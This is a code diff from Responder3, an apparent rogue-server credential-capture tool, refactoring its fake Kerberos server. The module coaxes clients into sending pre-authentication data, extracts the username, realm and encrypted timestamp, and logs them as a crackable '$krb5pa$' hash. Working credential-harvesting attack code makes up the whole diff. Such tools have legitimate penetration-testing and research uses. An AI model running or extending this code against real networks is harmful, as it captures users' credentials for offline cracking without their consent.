@@ -5,6 +5,8 @@ import logging
 import asyncio
 
 
+from responder3.core.logging.logger import *
+from responder3.core.asyncio_helpers import R3ConnectionClosed
 from responder3.core.commons import *
 from responder3.protocols.KerberosV5 import *
 from responder3.core.servertemplate import ResponderServer, ResponderServerSession
@@ -12,6 +14,7 @@ from responder3.core.servertemplate import ResponderServer, ResponderServerSessi
 class KERBEROSSession(ResponderServerSession):
 	def __init__(self, connection, log_queue):
 		ResponderServerSession.__init__(self, connection, log_queue, self.__class__.__name__)
+		self.parser = KerberosParser
 
 	def __repr__(self):
 		t  = '== KerberosSession ==\r\n'
@@ -20,19 +23,10 @@ class KERBEROSSession(ResponderServerSession):
 
 class KERBEROS(ResponderServer):
 	def init(self):
-		self.parser = KerberosParser
 		self.parse_settings()
 		
 	def parse_settings(self):
-		pass
-
-	async def parse_message(self, timeout=None):
-		try:
-			req = await asyncio.wait_for(self.parser.from_streamreader(self.creader), timeout=timeout)
-			return req
-		except asyncio.TimeoutError:
-			await self.log('Timeout!', logging.DEBUG)
-			
+		pass			
 			
 	async def request_preauth(self, realm):
 		"""
@@ -69,34 +63,38 @@ class KERBEROS(ResponderServer):
 		await self.cwriter.drain()
 		
 		
-
+	@r3trafficlogexception
 	async def run(self):
-		try:
-			while True:
-				msg = await asyncio.wait_for(self.parse_message(), timeout = 1)
-				asreq = msg.native
-				realm = asreq['req-body']['realm']
-				cname = asreq['req-body']['cname']['name-string'][0]
-				for padata in asreq['padata']:
-					if padata['padata-type'] == int(PADATA_TYPE('ENC-TIMESTAMP')):
-						edata = EncryptedData.load(padata['padata-value']).native
-						etype = edata['etype']
-						cipher = edata['cipher'].hex()
-						
-						fullhash = "$krb5pa$%s$%s$%s$dummy$%s" % (etype, cname, realm, cipher)
-						cred = Credential('krb5pa',
-								domain = realm,
-								username= cname,
-								fullhash=fullhash
-							)
-						await self.log_credential(cred)
-						return
-				
-				#message did not contain authentication data, requesting padata
-				await self.request_preauth(realm)
+		while not self.shutdown_evt.is_set():
+			try:
+				result = await asyncio.gather(*[asyncio.wait_for(self.session.parser.from_streamreader(self.creader), timeout=None)], return_exceptions=True)
+			except asyncio.CancelledError as e:
+				raise e
+			if isinstance(result[0], R3ConnectionClosed):
 				return
-				
+			elif isinstance(result[0], Exception):
+				raise result[0]
+			else:
+				msg = result[0]
+
+			asreq = msg.native
+			realm = asreq['req-body']['realm']
+			cname = asreq['req-body']['cname']['name-string'][0]
+			for padata in asreq['padata']:
+				if padata['padata-type'] == int(PADATA_TYPE('ENC-TIMESTAMP')):
+					edata = EncryptedData.load(padata['padata-value']).native
+					etype = edata['etype']
+					cipher = edata['cipher'].hex()
 					
-		except Exception as e:
-			await self.log_exception()
-			pass
+					fullhash = "$krb5pa$%s$%s$%s$dummy$%s" % (etype, cname, realm, cipher)
+					cred = Credential('krb5pa',
+							domain = realm,
+							username= cname,
+							fullhash=fullhash
+						)
+					await self.logger.credential(cred)
+					return
+				
+			#message did not contain authentication data, requesting padata
+			await self.request_preauth(realm)
+			return
